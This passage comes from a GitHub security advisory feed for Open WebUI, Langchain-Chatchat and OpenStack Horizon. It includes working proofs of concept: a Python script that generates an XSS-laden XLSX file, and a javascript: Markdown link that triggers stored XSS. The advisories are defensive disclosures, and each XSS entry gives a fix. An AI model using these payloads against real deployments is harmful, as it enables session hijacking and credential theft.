<p>The application currently has a function for checking if the user is authorized. However, it is not being utilized except for one endpoint. See <a href="https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/utils/utils.py#L110-L116">https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/utils/utils.py#L110-L116</a> for the correct function to use.</p>
<pre><code class="language-python">def get_verified_user(user=Depends(get_current_user)):
if user.role not in {"user", "admin"}:
    raise HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
    )
return user
</code></pre>
<p>Modify all authenticated endpoints to utilize <code>get_verified_user()</code> function instead of <code>get_current_user()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-4vg5-rp28-gvjf">https://github.com/open-webui/open-webui/security/advisories/GHSA-4vg5-rp28-gvjf</a></li>
<li><a href="https://github.com/advisories/GHSA-4vg5-rp28-gvjf">https://github.com/advisories/GHSA-4vg5-rp28-gvjf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vg5-rp28-gvjf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T22:34:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI has stored XSS in Excel file preview]]></title>
        <id>https://github.com/advisories/GHSA-jwf8-pv5p-vhmc</id>
        <link href="https://github.com/advisories/GHSA-jwf8-pv5p-vhmc"/>
        <updated>2026-05-08T22:26:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Excel file attachments are previewed in an unsafe way. A crafted XLSX file payload can be used to cause the <a href="https://git.sheetjs.com/sheetjs/sheetjs">sheetjs</a> function <a href="https://git.sheetjs.com/sheetjs/sheetjs/src/commit/66cf8d2117d271f89e4f47b5fed35a3e1ea93f67/bits/79_html.js#L127">sheet_to_html</a> to embed an XSS payload into the generated HTML. This is subsequently added to the DOM unsanitized via <a href="https://svelte.dev/docs/svelte/@html"><code>@html</code></a> causing the payload to trigger.</p>
<h3 id="details">Details</h3>
<p>The function used to convert XLSX documents to HTML for preview does not perform any input validation or sanitisation for the generated HTML
<a href="https://github.com/open-webui/open-webui/blob/a7271532f8a38da46785afcaa7e65f9a45e7d753/src/lib/components/common/FileItemModal.svelte#L120-L133">https://github.com/open-webui/open-webui/blob/a7271532f8a38da46785afcaa7e65f9a45e7d753/src/lib/components/common/FileItemModal.svelte#L120-L133</a>
XLSX attachments are processed by this function, converted to HTML with <code>XLSX.utils.sheet_to_html</code> before ultimately being assigned to the variable <code>excelHtml</code>. Later there is logic that causes this to be assigned directly to the DOM when the preview tab is selected.
<a href="https://github.com/open-webui/open-webui/blob/a7271532f8a38da46785afcaa7e65f9a45e7d753/src/lib/components/common/FileItemModal.svelte#L358-L400">https://github.com/open-webui/open-webui/blob/a7271532f8a38da46785afcaa7e65f9a45e7d753/src/lib/components/common/FileItemModal.svelte#L358-L400</a></p>
<h3 id="poc">PoC</h3>
<p>A python script to generate a payload file is as follows:</p>
<pre><code class="language-python">import xlsxwriter                                                                                                                
                                                                                                                                 
payload = '&lt;img src=x onerror="alert(\'XSS Triggered by XLSX file\')"&gt;'                                                          
                                                                                                                             
workbook = xlsxwriter.Workbook('xss_payload.xlsx')                                                                           
worksheet = workbook.add_worksheet()                                                                                         
                                                                                                                             
payload_format = workbook.add_format()                                                                                       
                                                                                                                             
worksheet.write_rich_string('A1',                                                                                            
    'This cell contains a hidden payload: ',                                                                                 
    payload_format, payload                                                                                                  
)                                                                                                                            
                                                                                                                             
worksheet.write('A2', 'This is a safe cell.')                                                                                
worksheet.write('B1', 'Column B')                                                                                            
                                                                                                                             
workbook.close()
</code></pre>
<p>Upload the generated file as an attachment to a chat, open the file modal, and click preview. Observe the XSS triggers.
<img width="2444" height="1386" alt="image" src="https://github.com/user-attachments/assets/8400efb0-ea6f-4878-abdb-4c2fe529241f">
This same process can be triggered in shared chats, allowing the payload to be distributed to victims.
<img width="2386" height="1646" alt="image" src="https://github.com/user-attachments/assets/d0eda49c-8fcf-4fc4-bbb0-c8951b0369c3"></p>
<h3 id="impact">Impact</h3>
<p>Any user can create a weaponised chat that can be shared and subsequently used to target other users.</p>
<p>Low privilege users are at risk of having their session taken over by a payload that reads their token from local storage and exfiltrates it to an attacker controlled server.</p>
<p>Admins are at risk of exposing the server to RCE via same chain described in GHSA-w7xj-8fx7-wfch.</p>
<h3 id="caveats">Caveats</h3>
<p>The file attachment in the shared chat must be opened and previewed to trigger the vulnerability.</p>
<h3 id="recommendation">Recommendation</h3>
<p>Sanitise the generated HTML with DOMPurify before assigning it to the DOM.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-jwf8-pv5p-vhmc">https://github.com/open-webui/open-webui/security/advisories/GHSA-jwf8-pv5p-vhmc</a></li>
<li><a href="https://github.com/advisories/GHSA-jwf8-pv5p-vhmc">https://github.com/advisories/GHSA-jwf8-pv5p-vhmc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jwf8-pv5p-vhmc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T22:26:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI has Stored XSS in Pending User Overlay via Incorrect DOMPurify Application Order]]></title>
        <id>https://github.com/advisories/GHSA-fq3v-xjjx-95rc</id>
        <link href="https://github.com/advisories/GHSA-fq3v-xjjx-95rc"/>
        <updated>2026-05-08T22:21:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
<p><strong>CWE-79</strong>: Cross-site Scripting (XSS)</p>
<p>The <code>AccountPending.svelte</code> component renders the admin-configured "Pending User Overlay Content" using <code>marked.parse()</code> inside <code>{@html}</code> with an incorrect DOMPurify application order:</p>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<p><strong><code>src/lib/components/layout/Overlay/AccountPending.svelte</code> (lines 43-48)</strong>:</p>
<pre><code class="language-svelte">{@html marked.parse(
    DOMPurify.sanitize(
        ($config?.ui?.pending_user_overlay_content ?? '').replace(/\n/g, '&lt;br&gt;')
    )
)}
</code></pre>
<p>DOMPurify is applied to the raw Markdown input <strong>before</strong> <code>marked.parse()</code> processes it. This is the wrong order. DOMPurify sanitizes the Markdown text (which contains no HTML tags), then <code>marked.parse()</code> converts Markdown link syntax into HTML <code>&lt;a&gt;</code> tags with <code>javascript:</code> href, and the result is rendered with <code>{@html}</code> unsanitized.</p>
<p>The correct pattern (used elsewhere in the codebase, e.g., <code>NotebookView.svelte:77</code>) is:</p>
<pre><code class="language-javascript">DOMPurify.sanitize(marked.parse(src))  // sanitize AFTER markdown parsing
</code></pre>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<h3 id="prerequisites">Prerequisites</h3>
<ul>
<li>Open WebUI v0.8.10</li>
<li>Admin account</li>
<li>A second user account with "pending" role</li>
</ul>
<h3 id="steps">Steps</h3>
<ol>
<li><p>Log in as admin and navigate to <strong>Admin Settings</strong> → <strong>Settings</strong> → <strong>General</strong>.</p>
</li>
<li><p>Set <strong>Default User Role</strong> to <code>pending</code>.</p>
</li>
<li><p>In the <strong>Pending User Overlay Content</strong> field, enter:</p>
</li>
</ol>
<pre><code># Account Pending

Your account is under review.

[Contact Support](javascript:alert(document.domain))
</code></pre>
<ol start="4">
<li><p>Save the settings.</p>
</li>
<li><p>In a separate browser (or incognito window), create a new account or log in as a pending user.</p>
</li>
<li><p>The pending overlay is displayed. Click the "Contact Support" link.</p>
</li>
<li><p>A JavaScript alert dialog appears showing <code>localhost</code> (the document domain), confirming XSS execution.</p>
</li>
</ol>
<h3 id="verified-output">Verified Output</h3>
<p>The <code>alert(document.domain)</code> executes successfully, displaying "localhost" in a JavaScript dialog box.</p>
<h2 id="impact">Impact</h2>
<p>An admin can inject arbitrary JavaScript into the Pending User Overlay Content that executes in the browser context of any pending user who views the overlay page. This could be used to:</p>
<ul>
<li><strong>Session hijacking</strong>: Steal pending users' JWT tokens from cookies/localStorage</li>
<li><strong>Credential theft</strong>: Replace the pending overlay with a fake login form</li>
<li><strong>Phishing</strong>: Redirect pending users to malicious sites</li>
</ul>
<p>While this requires admin privileges to set the overlay content, it enables an admin to attack pending users (who have not yet been granted full access). In multi-admin deployments, a compromised admin account could use this to escalate attacks.</p>
<h2 id="proposed-fix">Proposed Fix</h2>
<p>Apply DOMPurify <strong>after</strong> <code>marked.parse()</code>, not before:</p>
<pre><code class="language-svelte">&lt;!-- Before (vulnerable): --&gt;
{@html marked.parse(
    DOMPurify.sanitize(
        ($config?.ui?.pending_user_overlay_content ?? '').replace(/\n/g, '&lt;br&gt;')
    )
)}

&lt;!-- After (fixed): --&gt;
{@html DOMPurify.sanitize(
    marked.parse(
        ($config?.ui?.pending_user_overlay_content ?? '').replace(/\n/g, '&lt;br&gt;'),
        { async: false }
    )
)}
</code></pre>
<img width="1510" height="1093" alt="2026-03-23_03-07" src="https://github.com/user-attachments/assets/bcc94dd6-4f06-472b-9979-9759458c76b3">
### References

<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-fq3v-xjjx-95rc">https://github.com/open-webui/open-webui/security/advisories/GHSA-fq3v-xjjx-95rc</a></li>
<li><a href="https://github.com/advisories/GHSA-fq3v-xjjx-95rc">https://github.com/advisories/GHSA-fq3v-xjjx-95rc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fq3v-xjjx-95rc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-08T22:21:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain-chatchat] Langchain-Chatchat Uses Insufficiently Random Values]]></title>
        <id>https://github.com/advisories/GHSA-jv4p-mhmp-69vw</id>
        <link href="https://github.com/advisories/GHSA-jv4p-mhmp-69vw"/>
        <updated>2026-05-08T22:20:21.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in chatchat-space Langchain-Chatchat up to 0.3.1.3. The affected element is the function _get_file_id of the file libs/chatchat-server/chatchat/server/api_server/openai_routes.py of the component Uploaded File Handler. Performing a manipulation results in insufficiently random values. Access to the local network is required for this attack. The attack's complexity is rated as high. The exploitability is described as difficult. The exploit has been made public and could be used. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7847">https://nvd.nist.gov/vuln/detail/CVE-2026-7847</a></li>
<li><a href="https://github.com/chatchat-space/Langchain-Chatchat/issues/5464">https://github.com/chatchat-space/Langchain-Chatchat/issues/5464</a></li>
<li><a href="https://github.com/3em0/cve_repo/blob/main/Langchain-Chatchat/Vuln-3-Predictable-File-ID.md">https://github.com/3em0/cve_repo/blob/main/Langchain-Chatchat/Vuln-3-Predictable-File-ID.md</a></li>
<li><a href="https://github.com/chatchat-space/Langchain-Chatchat">https://github.com/chatchat-space/Langchain-Chatchat</a></li>
<li><a href="https://vuldb.com/submit/807796">https://vuldb.com/submit/807796</a></li>
<li><a href="https://vuldb.com/vuln/361126">https://vuldb.com/vuln/361126</a></li>
<li><a href="https://vuldb.com/vuln/361126/cti">https://vuldb.com/vuln/361126/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-jv4p-mhmp-69vw">https://github.com/advisories/GHSA-jv4p-mhmp-69vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jv4p-mhmp-69vw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-05T18:33:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[horizon] OpenStack Horizon has Incorrect Behavior Order]]></title>
        <id>https://github.com/advisories/GHSA-vxvf-xvm3-p8j5</id>
        <link href="https://github.com/advisories/GHSA-vxvf-xvm3-p8j5"/>
        <updated>2026-05-08T22:19:51.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Horizon 25.6 and 25.7 before 25.7.3. There is a write operation to the session storage backend before authentication and thus storage can be exhausted by unauthenticated requests. This is a regression of the CVE-2014-8124 fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43002">https://nvd.nist.gov/vuln/detail/CVE-2026-43002</a></li>
<li><a href="https://bugs.launchpad.net/horizon/+bug/2150331">https://bugs.launchpad.net/horizon/+bug/2150331</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/05/7">https://www.openwall.com/lists/oss-security/2026/05/05/7</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-009.html">https://security.openstack.org/ossa/OSSA-2026-009.html</a></li>
<li><a href="https://github.com/advisories/GHSA-vxvf-xvm3-p8j5">https://github.com/advisories/GHSA-vxvf-xvm3-p8j5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vxvf-xvm3-p8j5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T18:33:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain-chatchat] Langchain-Chatchat has a Race Condition in its OpenAI-Compatible File Upload API]]></title>
        <id>https://github.com/advisories/GHSA-x229-w2j4-h748</id>
        <link href="https://github.com/advisories/GHSA-x229-w2j4-h748"/>
        <updated>2026-05-08T22:17:33.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been found in chatchat-space Langchain-Chatchat up to 0.3.1.3. Impacted is the function files of the file libs/chatchat-server/chatchat/server/api_server/openai_routes.py of the component OpenAI-Compatible File Upload API. Such manipulation of the argument file.filename leads to time-of-check time-of-use. Access to the local network is required for this attack to succeed. The attack requires a high level of complexity. The exploitability is considered difficult. The exploit has been disclosed to the public and may be used. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7846">https://nvd.nist.gov/vuln/detail/CVE-2026-7846</a></li>
<li><a href="https://github.com/chatchat-space/Langchain-Chatchat/issues/5463">https://github.com/chatchat-space/Langchain-Chatchat/issues/5463</a></li>
<li><a href="https://github.com/3em0/cve_repo/blob/main/Langchain-Chatchat/Vuln-2-Silent-File-Overwrite.md">https://github.com/3em0/cve_repo/blob/main/Langchain-Chatchat/Vuln-2-Silent-File-Overwrite.md</a></li>
<li><a href="https://github.com/chatchat-space/Langchain-Chatchat">https://github.com/chatchat-space/Langchain-Chatchat</a></li>
<li><a href="https://vuldb.com/submit/807795">https://vuldb.com/submit/807795</a></li>
<li><a href="https://vuldb.com/vuln/361125">https://vuldb.com/vuln/361125</a></li>
<li><a href="https://vuldb.com/vuln/361125/cti">https://vuldb.com/vuln/361125/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-x229-w2j4-h748">https://github.com/advisories/GHSA-x229-w2j4-h748</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x229-w2j4-h748</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-05T18:33:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain-chatchat] Langchain-Chatchat Uses a Broken or Risky Cryptographic Algorithm]]></title>
        <id>https://github.com/advisories/GHSA-wmvv-fhm6-w34x</id>
        <link href="https://github.com/advisories/GHSA-wmvv-fhm6-w34x"/>
        <updated>2026-05-08T22:16:43.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw has been found in chatchat-space Langchain-Chatchat up to 0.3.1.3. This issue affects the function PIL.Image.tobytes of the file libs/chatchat-server/chatchat/webui_pages/dialogue/dialogue.py of the component Vision Chat Paste Image Handler. This manipulation of the argument paste_image.image_data causes use of weak hash. The attacker needs to be present on the local network. The attack is considered to have high complexity. The exploitability is assessed as difficult. The exploit has been published and may be used. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7845">https://nvd.nist.gov/vuln/detail/CVE-2026-7845</a></li>
<li><a href="https://github.com/chatchat-space/Langchain-Chatchat/issues/5462">https://github.com/chatchat-space/Langchain-Chatchat/issues/5462</a></li>
<li><a href="https://github.com/3em0/cve_repo/blob/main/Langchain-Chatchat/Vuln-1-tobytes-Hash-Collision.md">https://github.com/3em0/cve_repo/blob/main/Langchain-Chatchat/Vuln-1-tobytes-Hash-Collision.md</a></li>
<li><a href="https://github.com/chatchat-space/Langchain-Chatchat">https://github.com/chatchat-space/Langchain-Chatchat</a></li>
<li><a href="https://vuldb.com/submit/807794">https://vuldb.com/submit/807794</a></li>
<li><a href="https://vuldb.com/vuln/361124">https://vuldb.com/vuln/361124</a></li>
<li><a href="https://vuldb.com/vuln/361124/cti">https://vuldb.com/vuln/361124/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-wmvv-fhm6-w34x">https://github.com/advisories/GHSA-wmvv-fhm6-w34x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmvv-fhm6-w34x</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-05T18:33:26.000Z</published>
    </entry>
</feed>